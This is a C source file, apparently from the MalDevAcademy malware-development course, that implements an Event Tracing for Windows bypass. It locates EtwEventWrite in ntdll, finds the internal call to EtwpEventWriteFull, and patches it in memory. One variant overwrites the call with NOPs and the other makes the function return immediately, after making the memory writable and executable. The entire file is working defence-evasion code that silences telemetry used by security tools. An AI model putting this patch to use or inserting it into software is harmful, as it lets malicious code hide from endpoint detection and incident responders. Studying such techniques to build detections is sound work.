// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

typedef enum PATCH
{
	PATCH_ETW_EVENTWRITE,
	PATCH_ETW_EVENTWRITE_FULL
};


#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode
#define NOP_INSTRUCTION_OPCODE				0x90		// 'nop'	- instruction opcode

#define PATCH_SIZE							0x05


BOOL PatchEtwpEventWriteFullCall(enum PATCH ePatch) {

	int			i = 0;
	DWORD		dwOldProtection = 0x00;
	PBYTE		pEtwFuncAddress = NULL;

	// Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based on 'ePatch'
	pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
	if (!pEtwFuncAddress) {
		printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] Address Of \"%s\" : 0x%p \n", ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull", pEtwFuncAddress);

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwFuncAddress[i] == x64_RET_INSTRUCTION_OPCODE && pEtwFuncAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwFuncAddress[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwFuncAddress = (PBYTE)&pEtwFuncAddress[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return false
	if (pEtwFuncAddress != NULL && pEtwFuncAddress[0] != x64_CALL_INSTRUCTION_OPCODE)
		return FALSE;

	printf("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwFuncAddress);
	printf("\t> Patching with \"90 90 90 90 90\" ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch - Replacing the 'call EtwpEventWriteFull' with 0x90 instructions
	for (int j = 0; j < PATCH_SIZE; j++) {
		*(PBYTE)&pEtwFuncAddress[j] = NOP_INSTRUCTION_OPCODE;
	}

	// Change memory permissions to original
	if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n\n");

	return FALSE;
}





// Get the address of 'EtwpEventWriteFull'
PVOID FetchEtwpEventWriteFull() {

	INT		i				= 0;
	PBYTE	pEtwEventFunc	= NULL;
	DWORD	dwOffSet		= 0x00;

	// Both "EtwEventWrite" OR "EtwEventWriteFull" will work
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc)
		return NULL;
	printf("[+] pEtwEventFunc : 0x%0p \n", pEtwEventFunc);

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)&pEtwEventFunc[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE)
		return NULL;

	printf("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwEventFunc);

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	dwOffSet = *(DWORD*)pEtwEventFunc;
	printf("\t> Offset : 0x%0.8X \n", dwOffSet);

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}


BOOL PatchEtwpEventWriteFullStart() {

	PVOID		pEtwpEventWriteFull = NULL;
	DWORD		dwOldProtection		= 0x00;
	BYTE		pShellcode[3]		= {
		0x33, 0xC0,			// xor eax, eax
		0xC3				// ret
	};

	// Getting EtwpEventWriteFull address
	pEtwpEventWriteFull = FetchEtwpEventWriteFull();
	if (!pEtwpEventWriteFull)
		return FALSE;
	printf("[+] pEtwpEventWriteFull : 0x%p \n", pEtwpEventWriteFull);


	printf("\t> Patching with \"30 C0 C3\" ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch
	memcpy(pEtwpEventWriteFull, pShellcode, sizeof(pShellcode));

	// Change memory permissions to original
	if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}
	
	printf("[+] DONE !\n\n");

	return TRUE;
}




int main() {


//	PatchEtwpEventWriteFullCall(PATCH_ETW_EVENTWRITE);
//	PatchEtwpEventWriteFullCall(PATCH_ETW_EVENTWRITE_FULL);

	PatchEtwpEventWriteFullStart();

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	return 0;
}